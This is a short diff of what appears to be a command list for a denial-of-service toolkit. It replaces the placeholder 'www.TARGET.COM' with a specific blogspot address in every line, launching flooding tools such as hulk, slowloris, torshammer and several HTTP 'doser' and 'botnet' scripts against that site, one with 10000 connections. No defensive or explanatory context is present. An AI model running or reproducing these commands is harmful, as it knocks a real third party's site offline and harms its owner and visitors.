@@ -1,19 +1,19 @@
-python saphyra.py http://www.TARGET.COM
+python saphyra.py http://devildonghua.blogspot.com
 
-python hulk.py http://www.TARGET.COM
+python hulk.py http://devildonghua.blogspot.com
 
-python akira.py http://www.TARGET.COM
+python akira.py http://devildonghua.blogspot.com
 
-python botnet.py http://www.TARGET.COM
+python botnet.py http://devildonghua.blogspot.com
 
-python httpdoser.py http://www.TARGET.COM
+python httpdoser.py http://devildonghua.blogspot.com
 
-perl slowloris.pl -dns www.TARGET.COM
+perl slowloris.pl -dns http://devildonghua.blogspot.com
 
-python sadboys.py http://www.TARGET.COM
+python sadboys.py http://devildonghua.blogspot.com
 
-python sadattack.py http://www.TARGET.COM
+python sadattack.py http://devildonghua.blogspot.com
 
-python torshammer.py -t www.TARGET.COM -r 10000
+python torshammer.py -t http://devildonghua.blogspot.com -r 10000
 
 
